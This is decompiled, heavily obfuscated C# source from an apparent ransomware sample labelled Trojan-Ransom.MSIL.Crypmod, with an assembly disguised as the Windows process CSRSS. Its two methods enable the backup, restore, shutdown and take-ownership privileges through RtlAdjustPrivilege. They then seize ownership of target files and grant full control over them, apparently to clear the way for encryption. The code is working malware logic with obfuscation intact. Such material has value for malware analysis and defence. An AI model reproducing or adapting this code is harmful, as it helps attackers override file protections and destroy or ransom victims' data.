// Decompiled with JetBrains decompiler
// Type: _d3c219d6ed3b8b60烠㫩핐삄앟랎._6d604a38de5c5e96띤鄮糺솆厌믃賒媵䑳ⴌ뫂쌼짠ᇵ엠웮肣ꊘ템䥨䂐ￏ蟗戔掊ꋒ㶛탋뢉
// Assembly: CSRSS, Version=10.0.19041.546, Culture=neutral, PublicKeyToken=null
// MVID: 922CE0F6-AFCA-47F9-840F-4CAFB7753FD6
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.MSIL.Crypmod.gen-3b2e708eaa4744c76a633391cf2c983f4a098b46436525619e5ea44e105355fe.exe

using System;
using System.IO;
using System.Security.AccessControl;
using System.Security.Principal;

namespace _d3c219d6ed3b8b60烠㫩핐삄앟랎
{
  public static class _6d604a38de5c5e96띤鄮糺솆厌믃賒媵䑳ⴌ뫂쌼짠ᇵ엠웮肣ꊘ템䥨䂐ￏ蟗戔掊ꋒ㶛탋뢉
  {
    public static void _a39a27ee5cddb1d4ᯙ芐쭼Җ䰭浀埘튿榞갅蛆㦸䧩()
    {
      int index1 = 0;
      object[] objArray1 = new object[5]
      {
        (object) new int[6]
        {
          90,
          -630706777,
          90,
          630706880,
          10,
          180
        },
        (object) new int[9]
        {
          90,
          107732936,
          90,
          738439763,
          20,
          90,
          630706880,
          10,
          180
        },
        (object) new int[12]
        {
          90,
          -1268201081,
          90,
          1375934108,
          10,
          90,
          738439763,
          20,
          90,
          630706880,
          10,
          180
        },
        (object) new int[12]
        {
          90,
          -1268201092,
          90,
          1375934108,
          10,
          90,
          738439763,
          20,
          90,
          630706880,
          10,
          180
        },
        (object) new int[6]
        {
          90,
          -630706811,
          90,
          630706880,
          10,
          180
        }
      };
      for (; index1 < 5; ++index1)
      {
        switch (jjs9HVgylZcfR0.Op3pRI0B28vZwOn((int[]) objArray1[index1], 0, 0))
        {
          case 133:
            try
            {
              bool _7a2c4547b5127da3ఖ팦 = false;
              int index2 = 0;
              object[] objArray2 = new object[15]
              {
                (object) new int[6]
                {
                  90,
                  -630706612,
                  90,
                  630706880,
                  10,
                  180
                },
                (object) new int[9]
                {
                  90,
                  107733076,
                  90,
                  738439763,
                  20,
                  90,
                  630706880,
                  10,
                  180
                },
                (object) new int[9]
                {
                  90,
                  107732898,
                  90,
                  738439763,
                  20,
                  90,
                  630706880,
                  10,
                  180
                },
                (object) new int[6]
                {
                  90,
                  -630706583,
                  90,
                  630706880,
                  10,
                  180
                },
                (object) new int[9]
                {
                  90,
                  107733225,
                  90,
                  738439763,
                  20,
                  90,
                  630706880,
                  10,
                  180
                },
                (object) new int[9]
                {
                  90,
                  107733228,
                  90,
                  738439763,
                  20,
                  90,
                  630706880,
                  10,
                  180
                },
                (object) new int[6]
                {
                  90,
                  -630706670,
                  90,
                  630706880,
                  10,
                  180
                },
                (object) new int[6]
                {
                  90,
                  -630706618,
                  90,
                  630706880,
                  10,
                  180
                },
                (object) new int[12]
                {
                  90,
                  -1268201027,
                  90,
                  1375934108,
                  10,
                  90,
                  738439763,
                  20,
                  90,
                  630706880,
                  10,
                  180
                },
                (object) new int[12]
                {
                  90,
                  -1268201048,
                  90,
                  1375934108,
                  10,
                  90,
                  738439763,
                  20,
                  90,
                  630706880,
                  10,
                  180
                },
                (object) new int[9]
                {
                  90,
                  107733149,
                  90,
                  738439763,
                  20,
                  90,
                  630706880,
                  10,
                  180
                },
                (object) new int[12]
                {
                  90,
                  -1268200983,
                  90,
                  1375934108,
                  10,
                  90,
                  738439763,
                  20,
                  90,
                  630706880,
                  10,
                  180
                },
                (object) new int[9]
                {
                  90,
                  107733033,
                  90,
                  738439763,
                  20,
                  90,
                  630706880,
                  10,
                  180
                },
                (object) new int[6]
                {
                  90,
                  -630706557,
                  90,
                  630706880,
                  10,
                  180
                },
                (object) new int[12]
                {
                  90,
                  -1268201169,
                  90,
                  1375934108,
                  10,
                  90,
                  738439763,
                  20,
                  90,
                  630706880,
                  10,
                  180
                }
              };
              for (; index2 < 15; ++index2)
              {
                switch (jjs9HVgylZcfR0.Op3pRI0B28vZwOn((int[]) objArray2[index2], 0, 0))
                {
                  case 177:
                    _9f6717951b3535fb濫킪㔾惹氬ꘃ蛡猲躻頥馶샸踨Ⲏ水歸죒ᦢ䪲쿍灨䱔у䱥祩晏滨ㅱ땾㖚뗁봂撚염僤灜镒.RtlAdjustPrivilege(18UL, true, false, ref _7a2c4547b5127da3ఖ팦);
                    break;
                  case 193:
                    _9f6717951b3535fb濫킪㔾惹氬ꘃ蛡猲躻頥馶샸踨Ⲏ水歸죒ᦢ䪲쿍灨䱔у䱥祩晏滨ㅱ땾㖚뗁봂撚염僤灜镒.RtlAdjustPrivilege(9UL, true, false, ref _7a2c4547b5127da3ఖ팦);
                    break;
                  case 242:
                    _9f6717951b3535fb濫킪㔾惹氬ꘃ蛡猲躻頥馶샸踨Ⲏ水歸죒ᦢ䪲쿍灨䱔у䱥祩晏滨ㅱ땾㖚뗁봂撚염僤灜镒.RtlAdjustPrivilege(19UL, true, false, ref _7a2c4547b5127da3ఖ팦);
                    break;
                  case 297:
                    _9f6717951b3535fb濫킪㔾惹氬ꘃ蛡猲躻頥馶샸踨Ⲏ水歸죒ᦢ䪲쿍灨䱔у䱥祩晏滨ㅱ땾㖚뗁봂撚염僤灜镒.RtlAdjustPrivilege(17UL, true, false, ref _7a2c4547b5127da3ఖ팦);
                    break;
                }
              }
              break;
            }
            catch (Exception ex)
            {
              break;
            }
        }
      }
    }

    public static void _5b40272188ce0047ﱴᦧ柒鏄昽䮁봤䖆둯䓲標띬ဉ㘐眡谗霂馈羮핒ր(
      string _bfa84dd10f986943䂖ﺚ쎅崮뽼岐웤স唤䍴ꢧ頊示숨뛧㱭坏揦岞ᕓ賆᱈訕曪ՙϲ묊ㅺ钌箇뽕䧫琻熈)
    {
      int index1 = 0;
      object[] objArray1 = new object[5]
      {
        (object) new int[9]
        {
          90,
          107732894,
          90,
          738439763,
          20,
          90,
          630706880,
          10,
          180
        },
        (object) new int[12]
        {
          90,
          -1268201066,
          90,
          1375934108,
          10,
          90,
          738439763,
          20,
          90,
          630706880,
          10,
          180
        },
        (object) new int[9]
        {
          90,
          107733043,
          90,
          738439763,
          20,
          90,
          630706880,
          10,
          180
        },
        (object) new int[9]
        {
          90,
          107732969,
          90,
          738439763,
          20,
          90,
          630706880,
          10,
          180
        },
        (object) new int[9]
        {
          90,
          107732972,
          90,
          738439763,
          20,
          90,
          630706880,
          10,
          180
        }
      };
      for (; index1 < 5; ++index1)
      {
        switch (jjs9HVgylZcfR0.Op3pRI0B28vZwOn((int[]) objArray1[index1], 0, 0))
        {
          case 86:
            try
            {
              object obj = (object) null;
              SecurityIdentifier identity = WindowsIdentity.GetCurrent().User;
              int index2 = 0;
              object[] objArray2 = new object[5]
              {
                (object) new int[12]
                {
                  90,
                  -1268201064,
                  90,
                  1375934108,
                  10,
                  90,
                  738439763,
                  20,
                  90,
                  630706880,
                  10,
                  180
                },
                (object) new int[6]
                {
                  90,
                  -630706872,
                  90,
                  630706880,
                  10,
                  180
                },
                (object) new int[9]
                {
                  90,
                  107732892,
                  90,
                  738439763,
                  20,
                  90,
                  630706880,
                  10,
                  180
                },
                (object) new int[9]
                {
                  90,
                  107733076,
                  90,
                  738439763,
                  20,
                  90,
                  630706880,
                  10,
                  180
                },
                (object) new int[9]
                {
                  90,
                  107733047,
                  90,
                  738439763,
                  20,
                  90,
                  630706880,
                  10,
                  180
                }
              };
              for (; index2 < 5; ++index2)
              {
                switch (jjs9HVgylZcfR0.Op3pRI0B28vZwOn((int[]) objArray2[index2], 0, 0))
                {
                  case 163:
                    int num = (int) obj;
                    break;
                  case 193:
                    if (identity == (SecurityIdentifier) null)
                    {
                      int index3 = 0;
                      object[] objArray3 = new object[5]
                      {
                        (object) new int[6]
                        {
                          90,
                          -630706840,
                          90,
                          630706880,
                          10,
                          180
                        },
                        (object) new int[6]
                        {
                          90,
                          -630706832,
                          90,
                          630706880,
                          10,
                          180
                        },
                        (object) new int[6]
                        {
                          90,
                          -630706874,
                          90,
                          630706880,
                          10,
                          180
                        },
                        (object) new int[6]
                        {
                          90,
                          -630706838,
                          90,
                          630706880,
                          10,
                          180
                        },
                        (object) new int[6]
                        {
                          90,
                          -630706845,
                          90,
                          630706880,
                          10,
                          180
                        }
                      };
                      for (; index3 < 5; ++index3)
                      {
                        switch (jjs9HVgylZcfR0.Op3pRI0B28vZwOn((int[]) objArray3[index3], 0, 0))
                        {
                          case 42:
                            identity = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, (SecurityIdentifier) null);
                            break;
                        }
                      }
                      break;
                    }
                    break;
                }
              }
              FileSecurity accessControl = File.GetAccessControl(_bfa84dd10f986943䂖ﺚ쎅崮뽼岐웤স唤䍴ꢧ頊示숨뛧㱭坏揦岞ᕓ賆᱈訕曪ՙϲ묊ㅺ钌箇뽕䧫琻熈);
              int index4 = 0;
              object[] objArray4 = new object[13]
              {
                (object) new int[9]
                {
                  90,
                  107733036,
                  90,
                  738439763,
                  20,
                  90,
                  630706880,
                  10,
                  180
                },
                (object) new int[9]
                {
                  90,
                  107733266,
                  90,
                  738439763,
                  20,
                  90,
                  630706880,
                  10,
                  180
                },
                (object) new int[6]
                {
                  90,
                  -630706470,
                  90,
                  630706880,
                  10,
                  180
                },
                (object) new int[9]
                {
                  90,
                  107733196,
                  90,
                  738439763,
                  20,
                  90,
                  630706880,
                  10,
                  180
                },
                (object) new int[9]
                {
                  90,
                  107733187,
                  90,
                  738439763,
                  20,
                  90,
                  630706880,
                  10,
                  180
                },
                (object) new int[9]
                {
                  90,
                  107733300,
                  90,
                  738439763,
                  20,
                  90,
                  630706880,
                  10,
                  180
                },
                (object) new int[12]
                {
                  90,
                  -1268200812,
                  90,
                  1375934108,
                  10,
                  90,
                  738439763,
                  20,
                  90,
                  630706880,
                  10,
                  180
                },
                (object) new int[6]
                {
                  90,
                  -630706867,
                  90,
                  630706880,
                  10,
                  180
                },
                (object) new int[6]
                {
                  90,
                  -630706780,
                  90,
                  630706880,
                  10,
                  180
                },
                (object) new int[9]
                {
                  90,
                  107732887,
                  90,
                  738439763,
                  20,
                  90,
                  630706880,
                  10,
                  180
                },
                (object) new int[9]
                {
                  90,
                  107733288,
                  90,
                  738439763,
                  20,
                  90,
                  630706880,
                  10,
                  180
                },
                (object) new int[6]
                {
                  90,
                  -630706593,
                  90,
                  630706880,
                  10,
                  180
                },
                (object) new int[12]
                {
                  90,
                  -1268200783,
                  90,
                  1375934108,
                  10,
                  90,
                  738439763,
                  20,
                  90,
                  630706880,
                  10,
                  180
                }
              };
              for (; index4 < 13; ++index4)
              {
                switch (jjs9HVgylZcfR0.Op3pRI0B28vZwOn((int[]) objArray4[index4], 0, 0))
                {
                  case 4:
                    File.SetAccessControl(_bfa84dd10f986943䂖ﺚ쎅崮뽼岐웤স唤䍴ꢧ頊示숨뛧㱭坏揦岞ᕓ賆᱈訕曪ՙϲ묊ㅺ钌箇뽕䧫琻熈, accessControl);
                    break;
                  case 153:
                    accessControl.SetOwner((IdentityReference) identity);
                    break;
                  case 287:
                    accessControl.AddAccessRule(new FileSystemAccessRule((IdentityReference) identity, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Allow));
                    break;
                  case 405:
                    accessControl = File.GetAccessControl(_bfa84dd10f986943䂖ﺚ쎅崮뽼岐웤স唤䍴ꢧ頊示숨뛧㱭坏揦岞ᕓ賆᱈訕曪ՙϲ묊ㅺ钌箇뽕䧫琻熈);
                    break;
                  case 442:
                    File.SetAccessControl(_bfa84dd10f986943䂖ﺚ쎅崮뽼岐웤স唤䍴ꢧ頊示숨뛧㱭坏揦岞ᕓ賆᱈訕曪ՙϲ묊ㅺ钌箇뽕䧫琻熈, accessControl);
                    break;
                }
              }
              break;
            }
            catch (Exception ex)
            {
              break;
            }
        }
      }
    }
  }
}
